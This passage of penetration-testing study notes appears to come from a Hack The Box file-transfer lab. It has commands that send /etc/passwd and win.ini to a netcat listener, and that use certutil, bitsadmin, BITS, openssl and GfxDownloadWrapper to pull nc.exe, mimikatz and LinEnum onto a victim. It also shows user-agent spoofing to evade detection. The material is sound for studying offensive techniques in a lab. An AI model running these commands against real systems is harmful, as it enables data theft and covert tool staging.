                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

- Import Invoke-AESEncryption.ps1:

```bash
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```

- Encrypt a File:

```bash
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
File encrypted to C:\htb\scan-results.txt.aes

PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
```

### File encryption on Linux

- Encrypting with OpenSSL:

```bash
LordA2117@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

- Decrypt passwd.enc with OpenSSL:

```bash
LordA2117@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

## Catching files using HTTP/S

- Web transfer is commonly used because it is commonly allowed through the firewall


### NGINX enabling PUT

- Nginx is preferred over apache because its configuration is less complicated and its module system doesn't lead to as many security issues as Apache.

```bash
LordA2117@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory # Create the dir for uploaded files
LordA2117@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory # Change the owner to www-data
```

- Create the nginx configuration file:

```bash
LordA2117@htb[~]$ touch /etc/nginx/sites-available/upload.conf # create the nginx configuration file
```

- Contents of nginx config file:

```bash
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

- Setting up the site:

```bash
LordA2117@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/ # Symlink the site to sites-enabled directory
LordA2117@htb[/htb]$ sudo systemctl restart nginx.service # start nginx
LordA2117@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default # Remove the default config (in case of any errors)
```

Check `/var/log/nginx/error.log`

- Upload a file using cURL:

```bash
LordA2117@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

## Living Off The Land

- Coined by [Christopher Campbell @obscuresec](https://twitter.com/obscuresec) and [Matt Graeber](https://twitter.com/obscuresec) at [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw)
- Currently there are 2 major aggregators for LOLBins (Living Off the Land BINaries):
    - [GTFOBins](https://gtfobins.org/): For Linux
    - [LOLBAS](https://lolbas-project.github.io/): For Windows

### Using GTFOBins and LOLBAS

#### LOLBAS

- We can search for download or upload functions using `/download` or `/upload`.
- Here let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/).
- Upload win.ini to pwnbox:

```bash
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

- Receive in pwnbox:

```bash
LordA2117@htb[/htb]$ sudo nc -lvnp 8000
```

- In case there is an error, chance are that the version of certreq installed doesn't have the `-Post` parameter. Use [this](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) to get an updated version.


#### GTFOBins

- Use `+file upload` or `+file download` to search for binaries.
- Here we'll use *OpenSSL*.

- Create Certificate and start server in pwnbox:

```bash
LordA2117@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
LordA2117@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

- Download tool on the victim machine:

```bash
LordA2117@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### Other Common Living Off the Land Tools

- Bitsadmin Download function: The Background Intelligent Transfer Service (BITS) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

```bash
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

- Powershell enables interaction with BITS as follows:

```bash
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

- Certutil Download:

```bash
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

> NOTE: Modern Windows Antiviruses flag file download with certutil as malicious.

## Detection

Check module... it's all theory

## Evading Detection

- Changing user agent In Invoke-WebRequest:

Listing out user agents

```bash
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Request with Chrome User Agent:

```bash
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### LOLBAS / GTFOBins

- File transfer with GfxDownloadWrapper.exe:

```bash
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
